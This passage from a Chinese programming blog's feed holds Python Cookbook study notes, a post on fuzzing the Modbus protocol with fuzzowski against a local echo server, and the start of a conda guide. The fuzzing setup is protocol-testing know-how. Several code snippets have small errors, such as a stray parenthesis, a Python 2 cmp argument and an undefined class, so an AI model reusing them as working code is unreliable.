href="#1-16-过滤序列元素" class="headerlink" title="1.16 过滤序列元素"></a>1.16 过滤序列元素</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 过滤序列元素&quot;&quot;&quot; 可通过列表推导式达到目的，好处是同时还能充当简单的数据住转换。但是当元素结果集很大时则很占内存。可以将过滤代码放到一个函数中， 然后使用内建的 filter() 函数。&quot;&quot;&quot;# filter得到的是一个迭代器，如果想得到列表还需要进行list()转换values &#x3D; [&#39;1&#39;, &#39;2&#39;, &#39;-3&#39;, &#39;-&#39;, &#39;4&#39;, &#39;N&#x2F;A&#39;, &#39;5&#39;]def is_int(val):    try:        x &#x3D; int(val)        return True    except ValueError:        return Falseivals &#x3D; list(filter(is_int, values))print(ivals)# Outputs [&#39;1&#39;, &#39;2&#39;, &#39;-3&#39;, &#39;4&#39;, &#39;5&#39;]&quot;&quot;&quot; 列表推导式1. [i for i in range(k) if condition]：此时if起条件判断作用，满足条件的，将被返回成为最终生成的列表的一员。2. [i if condition else exp for exp]：此时if...else被用来赋值，满足条件的i以及else被用来生成最终的列表。&quot;&quot;&quot;print([i for i in range(10) if i % 2 &#x3D;&#x3D; 0])print([i if i &#x3D;&#x3D; 0 else 100 for i in range(10)])# Outputs[0, 2, 4, 6, 8][0, 100, 100, 100, 100, 100, 100, 100, 100, 100]</code></pre></div><h4 id="1-17-从字典中提取子集"><a href="#1-17-从字典中提取子集" class="headerlink" title="1.17 从字典中提取子集"></a>1.17 从字典中提取子集</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 从字典中提取子集# 使用字典推导prices &#x3D; &#123;    &#39;ACME&#39;: 45.23,    &#39;AAPL&#39;: 612.78,    &#39;IBM&#39;: 205.55,    &#39;HPQ&#39;: 37.20,    &#39;FB&#39;: 10.75&#125;# 取出value大于200的p1 &#x3D; &#123;key: value for key, value in prices.items() if value &gt; 200&#125;# 取出在name列表中的键值对tech_names &#x3D; &#123;&#39;AAPL&#39;, &#39;IBM&#39;, &#39;HPQ&#39;, &#39;MSFT&#39;&#125;p2 &#x3D; &#123;key: value for key, value in prices.items() if key in tech_names&#125;</code></pre></div><h4 id="1-18-映射名称到序列元素"><a href="#1-18-映射名称到序列元素" class="headerlink" title="1.18 映射名称到序列元素"></a>1.18 映射名称到序列元素</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 映射名称到序列元素&quot;&quot;&quot; 使用collections.namedtuple()，函数使用即在初始化的时候传入一个类型名与需要的下标字段。通过使用下标对元组中的内容进行组合操作会表意不清晰。命名元组与字典功能很接近，但是要更节省内存。&quot;&quot;&quot;from collections import namedtupleSubscriber &#x3D; namedtuple(&#39;Subscriber&#39;, [&#39;addr&#39;, &#39;joined&#39;])sub &#x3D; Subscriber(&#39;jonesy@example.com&#39;, &#39;2012-10-19&#39;)print(sub)  # Subscriber(addr&#x3D;&#39;jonesy@example.com&#39;, joined&#x3D;&#39;2012-10-19&#39;)print(sub.addr)  # jonesy@example.comprint(sub.joined)  # 2012-10-19# 举例使用，在命名元组中使用下标。# 实际上本身对records中的每条记录内容都知道是什么，只是为了表意清楚，使用有名字的下标进行计算。Stock &#x3D; namedtuple(&#39;Stock&#39;, [&#39;name&#39;, &#39;shares&#39;, &#39;price&#39;])def compute_cost(records):    total &#x3D; 0.0    for rec in records:        s &#x3D; Stock(*rec)        total +&#x3D; s.shares * s.price    return total</code></pre></div><h4 id="1-19-转换并同时计算数据"><a href="#1-19-转换并同时计算数据" class="headerlink" title="1.19 转换并同时计算数据"></a>1.19 转换并同时计算数据</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 转换并同时计算数据&quot;&quot;&quot; 练习使用生成器表达式参数&quot;&quot;&quot;# 计算平方和import osnums &#x3D; [1, 2, 3, 4, 5]s &#x3D; sum(x * x for x in nums)# 查看文件夹中是否包含.py后缀文件files &#x3D; os.listdir(&#39;dirname&#39;)if any(name.endswith(&#39;.py&#39;) for name in files):    print(&#39;There be python!&#39;)else:    print(&#39;Sorry, no python.&#39;)# 计算字典列表中某个key最小的valueportfolio &#x3D; [    &#123;&#39;name&#39;: &#39;GOOG&#39;, &#39;shares&#39;: 50&#125;,    &#123;&#39;name&#39;: &#39;YHOO&#39;, &#39;shares&#39;: 75&#125;,    &#123;&#39;name&#39;: &#39;AOL&#39;, &#39;shares&#39;: 20&#125;,    &#123;&#39;name&#39;: &#39;SCOX&#39;, &#39;shares&#39;: 65&#125;]min_shares &#x3D; min(s[&#39;shares&#39;] for s in portfolio)# 对于min() 和 max() 它们接受的一个 key 关键字参数或许对你很有帮助</code></pre></div><h4 id="1-20-合并多个字典或映射"><a href="#1-20-合并多个字典或映射" class="headerlink" title="1.20 合并多个字典或映射"></a>1.20 合并多个字典或映射</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 合并多个字典或映射&quot;&quot;&quot; 使用collections 模块中的 ChainMap 类&quot;&quot;&quot;from collections import ChainMapa &#x3D; &#123;&#39;x&#39;: 1, &#39;z&#39;: 3&#125;b &#x3D; &#123;&#39;y&#39;: 2, &#39;z&#39;: 4&#125;c &#x3D; ChainMap(a, b)  # 先从a找，再从b找print(c[&#39;x&#39;])  # Outputs 1 (from a)print(c[&#39;y&#39;])  # Outputs 2 (from b)print(c[&#39;z&#39;])  # Outputs 3 (from a)&quot;&quot;&quot; 通过这种操作的字典并不是真正的合并了，只是内部创建了容纳这些字典的列表，大部分字典操作可以正常使用。对于新字典的更新与删除会影响列表中的第一个字典。而使用update()方法，原字典的更新不会影响到新的合并字典。&quot;&quot;&quot;a &#x3D; &#123;&#39;x&#39;: 1, &#39;z&#39;: 3&#125;b &#x3D; &#123;&#39;y&#39;: 2, &#39;z&#39;: 4&#125;merged &#x3D; dict(b)merged.update(a)merged[&#39;x&#39;]  # 1merged[&#39;y&#39;]  # 2merged[&#39;z&#39;]  # 3a[&#39;x&#39;] &#x3D; 13merged[&#39;x&#39;]  # 1</code></pre></div><hr><blockquote><p>参考：</p><p><a href="https://python3-cookbook.readthedocs.io/zh_CN/latest/">https://python3-cookbook.readthedocs.io/zh_CN/latest/</a></p><p><a href="https://github.com/yidao620c/python3-cookbook">https://github.com/yidao620c/python3-cookbook</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>数据结构</tag>
      
      <tag>算法</tag>
      
      <tag>Cookbook</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python3-Cookbook第一章:数据结构和算法(1)</title>
    <link href="/posts/26745e6d/"/>
    <url>/posts/26745e6d/</url>
    
    <content type="html"><![CDATA[<blockquote><p>对于<strong>《Python Cookbook》</strong>一书进行学习，通过书中部分代码注释与自己的理解写成笔记方便学习与回忆。</p></blockquote><h4 id="1-1-解压序列赋值给多个变量"><a href="#1-1-解压序列赋值给多个变量" class="headerlink" title="1.1 解压序列赋值给多个变量"></a>1.1 解压序列赋值给多个变量</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 解压序列赋值给多个变量data &#x3D; [&#39;ACME&#39;, 50, 91.1, (2012, 12, 21)]name, shares, price, date &#x3D; dataprint(&quot;name: &#123;&#125;&quot;.format(name))  # Prints name: ACMEprint(&quot;shares: &#123;&#125;&quot;.format(shares))  # Prints shares: 50print(&quot;price: &#123;&#125;&quot;.format(price))  # Prints price: 91.1print(&quot;data: &#123;&#125;&quot;.format(data))  # Prints data: [&#39;ACME&#39;, 50, 91.1, (2012, 12, 21)]# 不需要的变量用占位符取代，最后丢弃即可name, _, _, date &#x3D; data# 字符串也可通过此种方式取值s &#x3D; &quot;hello&quot;a, b, c, d, e &#x3D; sprint(&quot;c: &#123;&#125;&quot;.format(c))  # Prints c: l</code></pre></div><h4 id="1-2-解压可迭代对象赋值给多个变量"><a href="#1-2-解压可迭代对象赋值给多个变量" class="headerlink" title="1.2 解压可迭代对象赋值给多个变量"></a>1.2 解压可迭代对象赋值给多个变量</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 解压可迭代对象赋值给多个变量# 1-1中如果item数量需要确定的去取&quot;&quot;&quot; Python中的星号键不是指针，代表取一个不定长的list；同样两个星号代表取一个不定长的dict &quot;&quot;&quot;record &#x3D; (&#39;Dave&#39;, &#39;dave@example.com&#39;, &#39;773-555-1212&#39;, &#39;847-555-1212&#39;)name, email, *number &#x3D; recordprint(&quot;name: &#123;&#125;&quot;.format(name))  # Prints name: Daveprint(&quot;email: &#123;&#125;&quot;.format(email))  # Prints email: dave@example.comprint(&quot;number: &#123;&#125;&quot;.format(number))  # Prints number: [&#39;773-555-1212&#39;, &#39;847-555-1212&#39;]# 用此种方法可以轻易取list中的第一个元素与最后一个元素record &#x3D; (&#39;Dave&#39;, &#39;dave@example.com&#39;, &#39;773-555-1212&#39;, &#39;847-555-1212&#39;, &#39;boss11&#39;)name, *_ &#x3D; record*_, stuff &#x3D; record# 同样此方法可以用来获取不确定的参数，用以函数传参等records &#x3D; [(&#39;foo&#39;, 1, 2), (&#39;bar&#39;, &#39;hello&#39;), (&#39;foo&#39;, 3, 4), ]def do_foo(x, y):    print(&#39;foo&#39;, x, y)def do_bar(s):    print(&#39;bar&#39;, s)for tag, *args in records:    if tag &#x3D;&#x3D; &#39;foo&#39;:        do_foo(*args)    elif tag &#x3D;&#x3D; &#39;bar&#39;:        do_bar(*args)# Prints # foo 1 2# bar hello# foo 3 4</code></pre></div><h4 id="1-3-保留最后N个元素"><a href="#1-3-保留最后N个元素" class="headerlink" title="1.3 保留最后N个元素"></a>1.3 保留最后N个元素</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 保留最后N个元素&quot;&quot;&quot; 使用collections.deque即可完成该操作，deque是一个可以设置长度的双端队列。具有append(),appendleft(),pop(),popleft()。&quot;&quot;&quot;from collections import dequeq &#x3D; deque(maxlen&#x3D;3)q.append(1)q.append(2)q.append(3)print(q)  # Prints deque([1, 2, 3], maxlen&#x3D;3)q.append(4)print(q)  # Prints deque([2, 3, 4], maxlen&#x3D;3)# 不指定大小则获得一个无限长度的双端队列q &#x3D; deque()q.append(1)q.append(2)q.append(3)print(q)  # Prints deque([1, 2, 3])q.appendleft(4)print(q)  # Prints deque([4, 1, 2, 3])print(q.pop())  # Prints 3print(q.popleft())  # Prints 4# 举例：保留文件中包含python字样的最后五行数据def search(lines, pattern, history&#x3D;5):    previous_lines &#x3D; deque(maxlen&#x3D;history)    for line in lines:        if pattern in line:            yield line, previous_lines        previous_lines.append(line)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    with open(r&#39;.&#x2F;somefile.txt&#39;) as f:        for line, prevlines in search(f, &#39;python&#39;, 5):            for pline in prevlines:                print(pline, end&#x3D;&#39;&#39;)                print(line, end&#x3D;&#39;&#39;)                print(&#39;-&#39; * 20)</code></pre></div><h4 id="1-4-查找最大最小的N个元素"><a href="#1-4-查找最大最小的N个元素" class="headerlink" title="1.4 查找最大最小的N个元素"></a>1.4 查找最大最小的N个元素</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 查找最大最小的N个元素&quot;&quot;&quot; heapq 模块有两个函数：nlargest() 和 nsmallest() 可以进行输出&quot;&quot;&quot;import heapqnums &#x3D; [1, 8, 2, 23, 7, -4, 18, 23, 42, 37, 2]print(heapq.nlargest(3, nums))  # Prints [42, 37, 23]print(heapq.nsmallest(3, nums))  # Prints [-4, 1, 2]# 同时支持复杂的数据结构的排序,需要传入一个key函数portfolio &#x3D; [    &#123;&#39;name&#39;: &#39;IBM&#39;, &#39;shares&#39;: 100, &#39;price&#39;: 91.1&#125;,    &#123;&#39;name&#39;: &#39;AAPL&#39;, &#39;shares&#39;: 50, &#39;price&#39;: 543.22&#125;,    &#123;&#39;name&#39;: &#39;FB&#39;, &#39;shares&#39;: 200, &#39;price&#39;: 21.09&#125;,    &#123;&#39;name&#39;: &#39;HPQ&#39;, &#39;shares&#39;: 35, &#39;price&#39;: 31.75&#125;,    &#123;&#39;name&#39;: &#39;YHOO&#39;, &#39;shares&#39;: 45, &#39;price&#39;: 16.35&#125;,    &#123;&#39;name&#39;: &#39;ACME&#39;, &#39;shares&#39;: 75, &#39;price&#39;: 115.65&#125;]cheap &#x3D; heapq.nsmallest(3, portfolio, key&#x3D;lambda s: s[&#39;price&#39;])expensive &#x3D; heapq.nlargest(3, portfolio, key&#x3D;lambda s: s[&#39;price&#39;])# 使用heapq.heapify对list进行处理heap &#x3D; list(nums)heapq.heapify(heap)  # 对heap进行排序heapq.heappop(heap)  # 弹出heap最下的元素，根据堆的性质每次都会弹出最小</code></pre></div><h4 id="1-5-优先级队列"><a href="#1-5-优先级队列" class="headerlink" title="1.5 优先级队列"></a>1.5 优先级队列</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 优先级队列，与一个元组顺序比较的小问题&quot;&quot;&quot; 利用1-4中的heapq堆，将优先级的负数传入，根据heapq每次会pop最小值的属性，从而每次pop出优先级最高的item（同样优先级的元素按照插入顺序输出）&quot;&quot;&quot;import heapqclass PriorityQueue:    def __init__(self):        self._queue &#x3D; []        self._index &#x3D; 0    def push(self, item, priority):        heapq.heappush(self._queue, (-priority, self._index, item))        self._index +&#x3D; 1    def pop(self):        return heapq.heappop(self._queue)[-1]&quot;&quot;&quot; 其中index变量的作用是保证同等优先级元素的正确排序。 通过保存一个不断增加的index下标变量，可以确保元素按照它们插入的顺序排序。 而且index变量也在相同优先级元素比较的时候起到重要作用。 &quot;&quot;&quot;# 展示另一个多元组大小比较的问题，多元组是依次比较同位置的元素，上例中的index就是避免了对比错误a &#x3D; (1, Item(&#39;foo&#39;))b &#x3D; (5, Item(&#39;bar&#39;))a &lt; b  # Print Truec &#x3D; (1, Item(&#39;grok&#39;))a &lt; c  # Print TypeError</code></pre></div><h4 id="1-6-字典中的键映射多个值"><a href="#1-6-字典中的键映射多个值" class="headerlink" title="1.6 字典中的键映射多个值"></a>1.6 字典中的键映射多个值</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 字典中的键映射多个值from collections import defaultdictd &#x3D; defaultdict(list)d[&#39;a&#39;].append(1)d[&#39;a&#39;].append(2)d[&#39;b&#39;].append(4)d &#x3D; defaultdict(set)d[&#39;a&#39;].add(1)d[&#39;a&#39;].add(2)d[&#39;b&#39;].add(4)&quot;&quot;&quot; 元组tuple(),不可变有序列表list[],可变有序字典dict&#123;key:value&#125;,存键值对无序集合set&#123;&#125;,无重复无序&quot;&quot;&quot;</code></pre></div><h4 id="1-7-字典排序"><a href="#1-7-字典排序" class="headerlink" title="1.7 字典排序"></a>1.7 字典排序</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 字典排序&quot;&quot;&quot; collections中的OrderedDict可以按照键值对插入字典的顺序存储dict&quot;&quot;&quot;from collections import OrderedDictd &#x3D; OrderedDict()d[&#39;foo&#39;] &#x3D; 1d[&#39;bar&#39;] &#x3D; 2d[&#39;spam&#39;] &#x3D; 3d[&#39;grok&#39;] &#x3D; 4# Outputs &quot;foo 1&quot;, &quot;bar 2&quot;, &quot;spam 3&quot;, &quot;grok 4&quot;for key in d:    print(key, d[key])&quot;&quot;&quot; Python sorted() 函数&quot;&quot;&quot;a &#x3D; [5,7,6,3,4,1,2]b &#x3D; sorted(a)# Outputs# [1, 2, 3, 4, 5, 6, 7] L&#x3D;[(&#39;b&#39;,2),(&#39;a&#39;,1),(&#39;c&#39;,3),(&#39;d&#39;,4)]sorted(L, cmp&#x3D;lambda x,y:cmp(x[1],y[1]))   # 利用cmp函数# Outputs# [(&#39;a&#39;, 1), (&#39;b&#39;, 2), (&#39;c&#39;, 3), (&#39;d&#39;, 4)]sorted(L, key&#x3D;lambda x:x[1])               # 利用key# Outputs# [(&#39;a&#39;, 1), (&#39;b&#39;, 2), (&#39;c&#39;, 3), (&#39;d&#39;, 4)] students &#x3D; [(&#39;john&#39;, &#39;A&#39;, 15), (&#39;jane&#39;, &#39;B&#39;, 12), (&#39;dave&#39;, &#39;B&#39;, 10)]sorted(students, key&#x3D;lambda s: s[2])            # 按年龄排序# Outputs# [(&#39;dave&#39;, &#39;B&#39;, 10), (&#39;jane&#39;, &#39;B&#39;, 12), (&#39;john&#39;, &#39;A&#39;, 15)]sorted(students, key&#x3D;lambda s: s[2], reverse&#x3D;True)       # 按降序# Outputs# [(&#39;john&#39;, &#39;A&#39;, 15), (&#39;jane&#39;, &#39;B&#39;, 12), (&#39;dave&#39;, &#39;B&#39;, 10)]</code></pre></div><h4 id="1-8-字典的运算"><a href="#1-8-字典的运算" class="headerlink" title="1.8 字典的运算"></a>1.8 字典的运算</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 字典的运算&quot;&quot;&quot;zip()，可以将两个数量相同的list一一对应组合。通过取出dict中的key，values，将其颠倒组合，就能对value进行排序最大最小等操作。注：Python3中的zip之后是一个对象而不是list，需要通过list()转成list。&quot;&quot;&quot;prices &#x3D; &#123;    &#39;ACME&#39;: 45.23,    &#39;AAPL&#39;: 612.78,    &#39;IBM&#39;: 205.55,    &#39;HPQ&#39;: 37.20,    &#39;FB&#39;: 10.75&#125;# prices.values()可以取出value所有值作为list。为了对字典值执行计算操作，通常需要使用 zip() 函数先将键和值反转过来。min_price &#x3D; min(zip(prices.values(), prices.keys()))# min_price is (10.75, &#39;FB&#39;)max_price &#x3D; max(zip(prices.values(), prices.keys()))# max_price is (612.78, &#39;AAPL&#39;)# 类似的，可以使用 zip() 和 sorted() 函数来排列字典数据：prices_sorted &#x3D; sorted(zip(prices.values(), prices.keys()))# prices_sorted is [(10.75, &#39;FB&#39;), (37.2, &#39;HPQ&#39;),#                   (45.23, &#39;ACME&#39;), (205.55, &#39;IBM&#39;),#                   (612.78, &#39;AAPL&#39;)]# 执行这些计算的时候，需要注意的是 zip() 函数创建的是一个只能访问一次的迭代器。 如果需要可以将zip后的list取出。vtok &#x3D; list(zip(prices.values(), prices.keys())))</code></pre></div><h4 id="1-9-查找两字典的相同点"><a href="#1-9-查找两字典的相同点" class="headerlink" title="1.9 查找两字典的相同点"></a>1.9 查找两字典的相同点</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 查找两字典的相同点&quot;&quot;&quot; 字典中的key是可以进行集合操作的。而a.values不可以，需要转成set后操作。&quot;&quot;&quot;a &#x3D; &#123;&#39;x&#39;: 1, &#39;y&#39;: 2, &#39;z&#39;: 3&#125;b &#x3D; &#123;&#39;w&#39;: 10, &#39;x&#39;: 11, &#39;y&#39;: 2&#125;# Find keys in commona.keys() &amp; b.keys()  # &#123; &#39;x&#39;, &#39;y&#39; &#125;# Find keys in a that are not in ba.keys() - b.keys()  # &#123; &#39;z&#39; &#125;# Find (key,value) pairs in commona.items() &amp; b.items()  # &#123; (&#39;y&#39;, 2) &#125;</code></pre></div><h4 id="1-10-删除序列相同元素并保持顺序"><a href="#1-10-删除序列相同元素并保持顺序" class="headerlink" title="1.10 删除序列相同元素并保持顺序"></a>1.10 删除序列相同元素并保持顺序</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 删除序列相同元素并保持顺序&quot;&quot;&quot; 如果序列上的值为hashable类型，则可以通过集合与生成器解决这个问题。其中集合是为了解决元素重复问题，yield则是依次返回元素到list。&quot;&quot;&quot;def dedupe(items):    seen &#x3D; set()    for item in items:        if item not in seen:            yield item            seen.add(item)a &#x3D; [1, 5, 2, 1, 9, 1, 5, 10]list(dedupe(a))# Outputs# [1, 5, 2, 9, 10]&quot;&quot;&quot; 如果你想消除元素不可哈希（比如 dict 类型）的序列中重复元素的话，需改动代码，将序列元素转换成hashable类型，其实即是选取需要对比的value。&quot;&quot;&quot;def dedupe2(items, key&#x3D;None):    seen &#x3D; set()    for item in items:        val &#x3D; item if key is None else key(item)        if val not in seen:            yield item            seen.add(val)a &#x3D; [&#123;&#39;x&#39;: 1, &#39;y&#39;: 2&#125;, &#123;&#39;x&#39;: 1, &#39;y&#39;: 3&#125;, &#123;&#39;x&#39;: 1, &#39;y&#39;: 2&#125;, &#123;&#39;x&#39;: 2, &#39;y&#39;: 4&#125;]list(dedupe2(a, key&#x3D;lambda d: (d[&#39;x&#39;], d[&#39;y&#39;])))# Outputs# [&#123;&#39;x&#39;: 1, &#39;y&#39;: 2&#125;, &#123;&#39;x&#39;: 1, &#39;y&#39;: 3&#125;, &#123;&#39;x&#39;: 2, &#39;y&#39;: 4&#125;]list(dedupe2(a, key&#x3D;lambda d: d[&#39;x&#39;]))# Outputs# [&#123;&#39;x&#39;: 1, &#39;y&#39;: 2&#125;, &#123;&#39;x&#39;: 2, &#39;y&#39;: 4&#125;]&quot;&quot;&quot; 仅仅消除元素的话用set就足够。对文件操作的话仅需进行如下变化，可以消除重复行：with open(somefile,&#39;r&#39;) as f:for line in dedupe(f):    ...&quot;&quot;&quot;</code></pre></div><hr><blockquote><p>参考：</p><p><a href="https://python3-cookbook.readthedocs.io/zh_CN/latest/">https://python3-cookbook.readthedocs.io/zh_CN/latest/</a></p><p><a href="https://github.com/yidao620c/python3-cookbook">https://github.com/yidao620c/python3-cookbook</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>数据结构</tag>
      
      <tag>算法</tag>
      
      <tag>Cookbook</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>测试使用fuzzowski框架</title>
    <link href="/posts/931e55d9/"/>
    <url>/posts/931e55d9/</url>
    
    <content type="html"><![CDATA[<p>fuzzowski是一个模糊测试器，目前主要支持LPD、IPP、BACnet、Modbus协议。本次测试使用的Modbus部分内容进行修改测试，实际上是通过测定规则生成数据通过tcp不断进行发包。</p><h3 id="Socket脚本"><a href="#Socket脚本" class="headerlink" title="Socket脚本"></a>Socket脚本</h3><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">import socketHOST &#x3D; &#39;0.0.0.0&#39;PORT &#x3D; 6678count &#x3D; 1s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.bind((HOST, PORT))s.listen(10)print(&#39;Server start at: %s:%s&#39; %(HOST, PORT))print(&#39;wait for connection...&#39;)while True:    conn, addr &#x3D; s.accept()    data &#x3D; conn.recv(1024)    f &#x3D; open(&quot;test1.txt&quot;,&#39;a&#39;)    f.write(&quot;&#123;:&lt;5d&#125;:&quot;.format(count))    for c in data:        f.write(&#39;%02X&#39; % ord(c))        f.write(&#39; &#39;)    f.write(&#39;\n&#39;)    f.close()    print(&quot;&#123;:&lt;5d&#125;:Connected by&#123;&#125;&quot;.format(count, addr))    count+&#x3D;1    conn.send(data)    conn.close()</code></pre></div><h3 id="Fuzzowski设置"><a href="#Fuzzowski设置" class="headerlink" title="Fuzzowski设置"></a>Fuzzowski设置</h3><p>先使用简单的<code>python3 -m fuzzowski 127.0.0.1 6789 -f modbus</code></p><p>经过输出测试，发现变动一个<code>word</code>型会产生<strong>140</strong>种十六进制数据，变动一个<code>byte</code>型会产生<strong>116</strong>种十六进制数据，为固定产生非随机生成。</p><p>通过测试modbus的read_coil模块，主要为<code>/fuzzowski-master/fuzzowski/fuzzers/modbus/modbus.py</code>中如下代码：</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">s_initialize(&quot;modbus_read_coil&quot;)with s_block(&quot;modbus_head&quot;):    s_word(0x0001,name&#x3D;&#39;transId&#39;,fuzzable&#x3D;True)    s_word(0x0000,name&#x3D;&#39;protoId&#39;,fuzzable&#x3D;False)    s_word(0x06,name&#x3D;&#39;length&#39;)    s_byte(0xff,name&#x3D;&#39;unit Identifier&#39;,fuzzable&#x3D;False)    with s_block(&#39;pdu&#39;):        s_byte(0x01,name&#x3D;&#39;funcCode read coil memory&#39;,fuzzable&#x3D;False)        s_word(0x0000,name&#x3D;&#39;start address&#39;)        s_word(0x0000,name&#x3D;&#39;quantity&#39;)s_initialize(&#39;read_holding_registers&#39;)with s_block(&quot;modbus_head&quot;):    s_word(0x0001,name&#x3D;&#39;transId&#39;,fuzzable&#x3D;False)    s_word(0x0002,name&#x3D;&#39;protoId&#39;,fuzzable&#x3D;False)    s_word(0x06,name&#x3D;&#39;length&#39;)    s_byte(0xff,name&#x3D;&#39;unit Identifier&#39;,fuzzable&#x3D;False)    with s_block(&#39;read_holding_registers_block&#39;):        s_byte(0x01,name&#x3D;&#39;read_holding_registers&#39;)        s_word(0x0000,name&#x3D;&#39;start address&#39;)        s_word(0x0000,name&#x3D;&#39;quantity&#39;)</code></pre></div><p>其中，fuzzable默认为True。设定为True的字段会依次产生变动生成数据，而非交叉产生，即一个数据包仅会有一个字段被fuzz。</p><p>举例修改上述模块为：</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">s_initialize(&quot;modbus_read_coil&quot;)with s_block(&quot;modbus_head&quot;):    s_byte(0x68,name&#x3D;&#39;funcCode read coil memory1&#39;,fuzzable&#x3D;False)    s_byte(0x04,name&#x3D;&#39;funcCode read coil memory2&#39;,fuzzable&#x3D;False)    s_byte(0x07,name&#x3D;&#39;funcCode read coil memory3&#39;,fuzzable&#x3D;True)    s_byte(0x00,name&#x3D;&#39;funcCode read coil memory4&#39;,fuzzable&#x3D;False)    s_byte(0x00,name&#x3D;&#39;funcCode read coil memory5&#39;,fuzzable&#x3D;False)    s_byte(0x00,name&#x3D;&#39;funcCode read coil memory6&#39;,fuzzable&#x3D;False)    s_initialize(&#39;read_holding_registers&#39;)with s_block(&quot;modbus_head&quot;):    s_word(0x0001,name&#x3D;&#39;transId&#39;,fuzzable&#x3D;False)    # s_word(0x0002,name&#x3D;&#39;protoId&#39;,fuzzable&#x3D;False)    # s_word(0x06,name&#x3D;&#39;length&#39;)    # s_byte(0xff,name&#x3D;&#39;unit Identifier&#39;,fuzzable&#x3D;False)    # with s_block(&#39;read_holding_registers_block&#39;):    #     s_byte(0x01,name&#x3D;&#39;read_holding_registers&#39;)    #     s_word(0x0000,name&#x3D;&#39;start address&#39;)    #     s_word(0x0000,name&#x3D;&#39;quantity&#39;)</code></pre></div><p>即只会生成<code>68 04 07 [00] 00 00</code>其中会对第4字节的fuzz数据，共112条。</p><p>通过<code>python3 -m fuzzowski 127.0.0.1 6789 -f modbus -tn -rt 1 -r read_coil</code>调用modbus的read_coil模块（实际上只是生成测试数据发送tcp包，设置为不处理响应）。</p><p><img src="/posts/931e55d9/modbus-fuzz.png"></p>]]></content>
    
    
    <categories>
      
      <category>项目组</category>
      
      <category>模糊测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz</tag>
      
      <tag>socket</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用conda管理环境</title>
    <link href="/posts/b42d039/"/>
    <url>/posts/b42d039/</url>
    
    <content type="html"><![CDATA[<blockquote><p>Python中具有数量庞大且功能相对完善的标准库和第三方库。通过对库的引用，能够实现对不同领域业务的开发。然而，正是由于库的数量庞大，对于管理这些库以及对库作及时的维护成为既重要但复杂度又高的事情。</p><p><a href="https://www.anaconda.com/products/individual#macos">Anaconda</a>就是可以便捷获取包且对包能够进行管理，同时对环境可以统一管理的发行版本。Anaconda包含了conda、Python在内的超过180个科学包及其依赖项。</p></blockquote><h3 id="1-Anaconda安装"><a href="#1-Anaconda安装" class="headerlink" title="1. Anaconda安装"></a>1. Anaconda安装</h3><p>在<a href="https://www.anaconda.com/products/individual">Anaconda</a>中下载对应的安装器安装。</p><p>例通过图形化界面安装完MacOS Anaconda，如果成功安装，通过<code>condal list</code>可以看到相关信息。</p><p>在终端中输入<code>python</code>。如果Anaconda被成功安装并且可以运行，则可看到Anaconda字样。</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">Python 3.7.6 (default, Jan  8 2020, 13:42:34)[Clang 4.0.1 (tags&#x2F;RELEASE_401&#x2F;final)] :: Anaconda, Inc. on darwin</code></pre></div><h3 id="2-管理conda环境"><a href="#2-管理conda环境" class="headerlink" title="2. 管理conda环境"></a>2. 管理conda环境</h3><blockquote><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda --version # 验证conda安装</code></pre></div></blockquote><h4 id="更新conda"><a href="#更新conda" class="headerlink" title="更新conda"></a>更新conda</h4><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda update conda</code></pre></div><h4 id="创建新环境"><a href="#创建新环境" class="headerlink" title="创建新环境"></a>创建新环境</h4><div class="code-wrapper"><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">conda create --name &lt;env_name&gt; &lt;package_names&gt;</code></pre></div><p>注意：</p><ul><li><p><code>&lt;env_name&gt;</code>即创建的环境名。建议以英文命名，且不加空格，名称两边不加尖括号“&lt;&gt;”。</p></li><li><p><code>&lt;package_names&gt;</code>即安装在环境中的包名。名称两边不加尖括号“&lt;&gt;”。</p></li><li><p><code>--name</code>同样可以替换为<code>-n</code>。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 创建名为python2的环境，python版本为2.7conda create --name python2_test python&#x3D;2.7# 创建名为python3的环境，python版本为3.5，同时创建numpy和pandas包conda create -n python3 python&#x3D;3.5 numpy 